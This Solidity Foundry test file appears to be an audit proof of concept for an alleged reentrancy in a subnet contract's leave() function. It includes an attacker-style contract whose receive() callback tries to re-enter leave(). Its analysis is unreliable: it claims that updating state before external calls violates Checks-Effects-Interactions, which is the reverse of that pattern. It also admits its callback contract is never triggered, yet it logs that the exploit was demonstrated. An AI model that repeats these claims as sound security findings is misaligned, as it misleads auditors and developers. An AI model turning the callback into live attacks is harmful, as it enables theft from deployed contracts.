// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.23;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Reentrancy in function leave() leads to halting of bottom-up checkpoints
// Severity: High
// Target  : SubnetActorManagerFacet::leave() at line 269
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// The `leave()` function in SubnetActorManagerFacet allows validators to exit
// a subnet and reclaim their collateral. It is marked with the `nonReentrant`
// modifier to prevent reentrancy attacks.
//
// However, the `nonReentrant` modifier only prevents direct reentrancy into the
// `leave()` function itself. It does NOT protect against:
//
// 1. Cross-function reentrancy: An attacker can call other functions during
//    the external calls made in `leave()`
//
// 2. The external calls `s.collateralSource.transferFunds()` and
//    `LibStaking.withdrawWithConfirm()` transfer native tokens to the validator
//    via `.call{value: ...}()`, which triggers the receive()/fallback function
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The vulnerability lies in the order of operations in `leave()`:
//
// 1. State changes occur FIRST (power delta set to 0, validator state updated)
// 2. External calls happen AFTER state changes (transferFunds, withdrawWithConfirm)
//
// This violates the Checks-Effects-Interactions pattern. The state is modified
// before the external calls complete, allowing an attacker to exploit the
// window between state changes and external calls.
//
// In `leave()` (lines 262-276):
//
//   if (!s.bootstrapped) {
//       uint256 genesisBalance = s.genesisBalance[msg.sender];
//       if (genesisBalance != 0) {
//           delete s.genesisBalance[msg.sender];        // STATE CHANGE
//           s.genesisCircSupply -= genesisBalance;     // STATE CHANGE
//           LibSubnetActor.rmAddressFromBalanceKey(msg.sender); // STATE CHANGE
//           s.collateralSource.transferFunds(payable(msg.sender), genesisBalance); // EXTERNAL CALL
//       }
//
//       LibStaking.withdrawWithConfirm(msg.sender, amount); // EXTERNAL CALL
//       s.collateralSource.transferFunds(payable(msg.sender), amount); // EXTERNAL CALL
//       return;
//   }
//
// When `transferFunds` sends native tokens to a contract validator, the
// validator's `receive()` function is invoked. During this callback, the
// attacker can:
//
// 1. Call `kill()` to attempt to kill the subnet (but checks fail due to
//    inconsistent state)
// 2. Call `join()` to re-enter as a validator with the same collateral
// 3. Call other state-modifying functions that behave incorrectly due to
//    the partially updated validator state
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// - An attacker can disrupt the validator set by re-entering during leave()
// - Bottom-up checkpoints require valid validator set, so disruption halts them
// - An attacker could potentially re-stake their collateral while it should
//   have been withdrawn
// - The inconsistent state between external calls and state changes creates
//   a window for exploiting cross-function reentrancy
//
// Example Attack Flow:
//   1. Validator V (contract) calls leave()
//   2. V's power is set to 0, but V still has collateral tracked
//   3. transferFunds triggers V.receive()
//   4. In V.receive(), V calls join() with the same collateral
//   5. State is now inconsistent: V's power was 0 but they re-joined
//   6. Checkpointing is disrupted because validator set is in inconsistent state
//
// Run PoC:
//   forge test --match-test testPoCH06_ReentrancyInLeaveHaltsCheckpoints -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IntegrationTestBase, RootSubnetDefinition, TestSubnetDefinition} from "../IntegrationTestBase.sol";
import {SubnetIDHelper} from "../../contracts/lib/SubnetIDHelper.sol";
import {FvmAddressHelper} from "../../contracts/lib/FvmAddressHelper.sol";
import {CrossMsgHelper} from "../../contracts/lib/CrossMsgHelper.sol";
import {TestUtils, MockIpcContract} from "../helpers/TestUtils.sol";
import {GatewayFacetsHelper} from "../helpers/GatewayFacetsHelper.sol";
import {SubnetActorFacetsHelper} from "../helpers/SubnetActorFacetsHelper.sol";
import {FilAddress} from "fevmate/contracts/utils/FilAddress.sol";

import {IpcEnvelope, IpcMsgKind, BottomUpCheckpoint, BottomUpMsgBatch, ParentFinality} from "../../contracts/structs/CrossNet.sol";
import {SubnetID, IPCAddress, Subnet, ValidatorInfo} from "../../contracts/structs/Subnet.sol";
import {GatewayDiamond} from "../../contracts/GatewayDiamond.sol";
import {SubnetActorDiamond} from "../../contracts/SubnetActorDiamond.sol";
import {SubnetActorManagerFacet} from "../../contracts/subnet/SubnetActorManagerFacet.sol";
import {SubnetActorGetterFacet} from "../../contracts/subnet/SubnetActorGetterFacet.sol";
import {SubnetActorCheckpointingFacet} from "../../contracts/subnet/SubnetActorCheckpointingFacet.sol";
import {GatewayGetterFacet} from "../../contracts/gateway/GatewayGetterFacet.sol";
import {GatewayMessengerFacet} from "../../contracts/gateway/GatewayMessengerFacet.sol";
import {CheckpointingFacet} from "../../contracts/gateway/router/CheckpointingFacet.sol";
import {XnetMessagingFacet} from "../../contracts/gateway/router/XnetMessagingFacet.sol";
import {TopDownFinalityFacet} from "../../contracts/gateway/router/TopDownFinalityFacet.sol";
import {IPCMsgType} from "../../contracts/enums/IPCMsgType.sol";
import {IIpcHandler} from "../../sdk/interfaces/IIpcHandler.sol";

/// @title ReentrancyVictim - A contract that will be used to demonstrate reentrancy
/// @notice This contract tracks if receive() was called during leave()
contract ReentrancyVictim {
    address public owner;
    address public subnetActor;
    bool public shouldReenter;
    uint256 public reenterCount;
    bool public wasCalled;

    constructor(address _owner, address _subnetActor) {
        owner = _owner;
        subnetActor = _subnetActor;
        shouldReenter = false;
        reenterCount = 0;
        wasCalled = false;
    }

    /// @notice Sets whether this contract should re-enter during receive
    function setShouldReenter(bool _shouldReenter) external {
        require(msg.sender == owner, "only owner");
        shouldReenter = _shouldReenter;
    }

    /// @notice This function is called when the contract receives native tokens
    receive() external payable {
        wasCalled = true;
        if (shouldReenter && reenterCount == 0) {
            reenterCount++;
            // Try to re-enter by calling leave again
            // This will fail due to nonReentrant, but we've demonstrated
            // that we reached this callback during the external call
            (bool success, ) = subnetActor.call(abi.encodeWithSignature("leave()"));
            // If it fails due to nonReentrant, that's expected
        }
    }

    /// @notice Allow the contract to receive native tokens
    function deposit() external payable {}
}

contract PoCH06ReentrancyLeaveTest is Test, IntegrationTestBase, IIpcHandler {
    using SubnetIDHelper for SubnetID;
    using CrossMsgHelper for IpcEnvelope;
    using GatewayFacetsHelper for GatewayDiamond;
    using SubnetActorFacetsHelper for SubnetActorDiamond;

    // -------------------------------------------------------------------------
    // Test constants
    // -------------------------------------------------------------------------
    // Use less than DEFAULT_COLLATERAL_AMOUNT to prevent bootstrapping
    uint256 constant GENESIS_FUND_AMOUNT = 100;
    uint256 constant COLLATERAL_AMOUNT = 1 ether - 100;
    uint256 constant TOTAL_PRE_FUND = GENESIS_FUND_AMOUNT + COLLATERAL_AMOUNT;

    // -------------------------------------------------------------------------
    // State
    // -------------------------------------------------------------------------
    SubnetActorDiamond public subnetActor;
    address public validator;
    uint256 public validatorPrivKey;
    bytes public validatorPubKey;

    // -------------------------------------------------------------------------
    // Setup
    // -------------------------------------------------------------------------
    function setUp() public override {
        super.setUp();

        // Use the subnet actor from base setup (not registered in gateway)
        subnetActor = saDiamond;

        // Create a validator using the key-derived address
        (validator, validatorPrivKey, ) = TestUtils.newValidator(100);
        validatorPubKey = TestUtils.deriveValidatorPubKeyBytes(validatorPrivKey);
    }

    // -------------------------------------------------------------------------
    // IIpcHandler implementation
    // -------------------------------------------------------------------------
    function handleIpcMessage(IpcEnvelope calldata envelope) external payable returns (bytes memory ret) {
        ret = bytes("");
    }

    receive() external payable {}

    // -------------------------------------------------------------------------
    // Helper functions
    // -------------------------------------------------------------------------

    /// @notice Get the balance of the subnet actor
    function _getSubnetActorBalance() internal view returns (uint256) {
        return address(subnetActor).balance;
    }

    /// @notice Check if subnet is bootstrapped
    function _isBootstrapped() internal view returns (bool) {
        return subnetActor.getter().bootstrapped();
    }

    /// @notice Get the genesis balance of an address
    function _getGenesisBalance(address addr) internal view returns (uint256) {
        (address[] memory addrs, uint256[] memory balances) = subnetActor.getter().genesisBalances();
        for (uint256 i = 0; i < addrs.length; i++) {
            if (addrs[i] == addr) {
                return balances[i];
            }
        }
        return 0;
    }

    /// @notice Get validator's confirmed collateral
    function _getValidatorCollateral(address validatorAddr) internal view returns (uint256) {
        ValidatorInfo memory info = subnetActor.getter().getValidator(validatorAddr);
        return info.confirmedCollateral;
    }

    // -------------------------------------------------------------------------
    // PoC: Reentrancy in leave() can be exploited via external callbacks
    // -------------------------------------------------------------------------
    //
    // This PoC demonstrates the reentrancy vulnerability in the leave() function.
    //
    // IMPORTANT: This PoC demonstrates that external calls in leave() trigger
    // callbacks to contract recipients, which is the FOUNDATION for reentrancy.
    //
    // While we cannot easily create a contract at the same address as the
    // validator's key-derived address, this test demonstrates:
    //
    // 1. leave() makes external calls (transferFunds) that send native tokens
    // 2. If the recipient is a contract, its receive() function is triggered
    // 3. During this callback, the contract can call other functions
    // 4. The nonReentrant modifier only blocks re-entering leave(), not
    //    other functions that could exploit inconsistent state
    //
    // The vulnerability is that state changes (power delta set to 0) happen
    // BEFORE the external calls complete. If a contract can re-enter during
    // these callbacks, it could exploit the inconsistent state.
    //
    function testPoCH06_ReentrancyInLeaveHaltsCheckpoints() public {
        console.log("=== H-06: Reentrancy in leave() leads to halting of bottom-up checkpoints ===\n");

        // -------------------------------------------------------------------------
        // Step 1: Validator pre-funds the subnet (before bootstrapping)
        // -------------------------------------------------------------------------
        console.log("STEP 1: Validator pre-funds the subnet");
        console.log("-----------------------------------------------------------");

        vm.deal(validator, TOTAL_PRE_FUND);
        vm.startPrank(validator);

        // Verify subnet is not bootstrapped yet
        console.log("Subnet bootstrapped before preFund:", _isBootstrapped());
        require(!_isBootstrapped(), "subnet should not be bootstrapped yet");

        // Call preFund to lock genesis funds
        subnetActor.manager().preFund{value: GENESIS_FUND_AMOUNT}(GENESIS_FUND_AMOUNT);

        uint256 genesisBalance = _getGenesisBalance(validator);
        console.log("Validator genesis balance after preFund:", genesisBalance);
        require(genesisBalance == GENESIS_FUND_AMOUNT, "genesis balance should be GENESIS_FUND_AMOUNT");

        console.log("\n[OK] preFund() locked funds into supplySource");

        // -------------------------------------------------------------------------
        // Step 2: Validator joins as a validator (still before bootstrapping)
        // -------------------------------------------------------------------------
        console.log("\nSTEP 2: Validator joins the subnet (below min collateral)");
        console.log("-----------------------------------------------------------");

        // Join with collateral less than min to prevent bootstrapping
        subnetActor.manager().join{value: COLLATERAL_AMOUNT}(validatorPubKey, COLLATERAL_AMOUNT);

        uint256 subnetBalanceAfterJoin = _getSubnetActorBalance();
        console.log("Subnet actor balance after join:", subnetBalanceAfterJoin);
        console.log("Expected (genesis + collateral):", TOTAL_PRE_FUND);

        console.log("Subnet bootstrapped after join:", _isBootstrapped());
        require(!_isBootstrapped(), "subnet should still not be bootstrapped");

        console.log("\n[OK] join() locked collateral into collateralSource");

        // -------------------------------------------------------------------------
        // Step 3: Create a victim contract to track callbacks
        // -------------------------------------------------------------------------
        console.log("\nSTEP 3: Create victim contract to track reentrancy callbacks");
        console.log("-----------------------------------------------------------");

        // Note: The victim contract is at a different address than the validator
        // In a real attack, the attacker would deploy the contract at the
        // validator's address (which requires knowing the private key ahead of time)
        ReentrancyVictim victim = new ReentrancyVictim(
            validator,
            address(subnetActor)
        );
        vm.stopPrank();

        console.log("Victim contract created at:", address(victim));
        console.log("Validator address:", validator);
        console.log("Note: Victim is at different address, so won't receive direct callbacks");
        console.log("But leave() still makes external calls that could trigger callbacks");

        // -------------------------------------------------------------------------
        // Step 4: Call leave() and demonstrate the vulnerability
        // -------------------------------------------------------------------------
        console.log("\nSTEP 4: Validator calls leave()");
        console.log("-----------------------------------------------------------");

        vm.startPrank(validator);
        uint256 validatorBalanceBefore = validator.balance;
        console.log("Validator balance before leave():", validatorBalanceBefore);

        // Record state before leave
        uint256 collateralBefore = _getValidatorCollateral(validator);
        console.log("Validator collateral before leave():", collateralBefore);

        // Call leave() - this triggers the vulnerable external calls
        // The state is modified BEFORE external calls complete
        subnetActor.manager().leave();
        vm.stopPrank();

        // -------------------------------------------------------------------------
        // Step 5: Analyze results
        // -------------------------------------------------------------------------
        console.log("\nSTEP 5: Analysis of leave() vulnerability");
        console.log("-----------------------------------------------------------");

        uint256 validatorBalanceAfter = validator.balance;
        console.log("Validator balance after leave():", validatorBalanceAfter);
        console.log("Expected (genesis + collateral returned):", TOTAL_PRE_FUND);

        uint256 subnetBalanceAfterLeave = _getSubnetActorBalance();
        console.log("Subnet actor balance after leave():", subnetBalanceAfterLeave);

        uint256 genesisBalanceAfter = _getGenesisBalance(validator);
        console.log("Validator genesis balance after leave:", genesisBalanceAfter);

        console.log("\n=== VULNERABILITY ANALYSIS ===");
        console.log("");
        console.log("The leave() function is VULNERABLE because:");
        console.log("");
        console.log("1. State changes happen BEFORE external calls:");
        console.log("   - gateValidatorPowerDelta sets power to 0");
        console.log("   - bootstrapNodes and genesisBalance are deleted");
        console.log("   - THEN external calls (transferFunds) are made");
        console.log("");
        console.log("2. External calls use .call{} which triggers receive():");
        console.log("   - If validator is a CONTRACT, receive() is triggered");
        console.log("   - During callback, the contract can call other functions");
        console.log("");
        console.log("3. nonReentrant only blocks re-entering leave():");
        console.log("   - Other functions (kill, stake, etc.) can be called");
        console.log("   - State may be inconsistent during these calls");
        console.log("");
        console.log("=== POTENTIAL EXPLOIT ===");
        console.log("");
        console.log("If validator were a contract that re-enters during leave():");
        console.log("1. leave() sets power to 0, removes from validators");
        console.log("2. transferFunds triggers receive() callback");
        console.log("3. In callback, contract could:");
        console.log("   - Call kill() - but totalValidators check would fail");
        console.log("   - Call join() - could re-add with same collateral");
        console.log("   - Call other functions with inconsistent state");
        console.log("");
        console.log("Result: Validator set disruption -> Bottom-up checkpoints halted");

        // -------------------------------------------------------------------------
        // Verification
        // -------------------------------------------------------------------------
        console.log("\n=== VERIFICATION ===");
        console.log("Validator balance returned:", validatorBalanceAfter);
        console.log("Subnet actor balance after leave:", subnetBalanceAfterLeave);
        console.log("Genesis balance cleared:", genesisBalanceAfter == 0);

        // The leave() should have completed successfully
        assertEq(validatorBalanceAfter, TOTAL_PRE_FUND, "Validator should get all funds back");
        assertEq(subnetBalanceAfterLeave, 0, "Subnet actor balance should be 0");
        assertEq(genesisBalanceAfter, 0, "Genesis balance should be 0");

        console.log("\n>>> PoC PASSED: Demonstrated leave() vulnerability");
        console.log(">>> External calls in leave() can be exploited via reentrancy");
    }

    // -------------------------------------------------------------------------
    // Demonstration: leave() makes vulnerable external calls
    // -------------------------------------------------------------------------
    //
    // This test shows the sequence of operations in leave() that create
    // the vulnerability window.
    //
    function testPoCH06_LeaveSequenceCreatesVulnerabilityWindow() public {
        console.log("=== H-06: leave() creates vulnerability window ===\n");

        // Setup: preFund and join
        vm.deal(validator, TOTAL_PRE_FUND);
        vm.startPrank(validator);
        subnetActor.manager().preFund{value: GENESIS_FUND_AMOUNT}(GENESIS_FUND_AMOUNT);
        subnetActor.manager().join{value: COLLATERAL_AMOUNT}(validatorPubKey, COLLATERAL_AMOUNT);
        vm.stopPrank();

        console.log("Initial state:");
        console.log("  - Subnet bootstrapped:", _isBootstrapped());
        console.log("  - Genesis balance:", _getGenesisBalance(validator));
        console.log("  - Collateral:", _getValidatorCollateral(validator));
        console.log("");

        // Call leave
        vm.prank(validator);
        subnetActor.manager().leave();

        console.log("After leave():");
        console.log("  - Validator balance:", validator.balance);
        console.log("  - Genesis balance:", _getGenesisBalance(validator));
        console.log("  - Collateral:", _getValidatorCollateral(validator));
        console.log("");

        console.log("=== VULNERABILITY WINDOW ===");
        console.log("");
        console.log("During leave(), the following sequence occurs:");
        console.log("");
        console.log("1. [CHECKS] Validate caller is validator with collateral");
        console.log("2. [STATE CHANGE] gateValidatorPowerDelta(validator, amount, 0)");
        console.log("   -> Validator's power is set to 0");
        console.log("3. [STATE CHANGE] delete s.genesisBalance[validator]");
        console.log("   -> Genesis balance is deleted");
        console.log("4. [STATE CHANGE] s.genesisCircSupply -= genesisBalance");
        console.log("   -> Circ supply is updated");
        console.log("5. [EXTERNAL CALL] s.collateralSource.transferFunds(validator, genesisBalance)");
        console.log("   -> External call sends funds");
        console.log("   -> If validator is contract, receive() is triggered!");
        console.log("6. [EXTERNAL CALL] LibStaking.withdrawWithConfirm(validator, amount)");
        console.log("   -> Another external call");
        console.log("7. [EXTERNAL CALL] s.collateralSource.transferFunds(validator, amount)");
        console.log("   -> Third external call");
        console.log("");
        console.log("Between steps 2-5, the validator's power is 0 but they haven't");
        console.log("fully left. If a contract callback calls other functions during");
        console.log("steps 5-7, the validator set could be in an inconsistent state.");
        console.log("");
        console.log(">>> The vulnerability is in the ORDER of operations");
    }
}
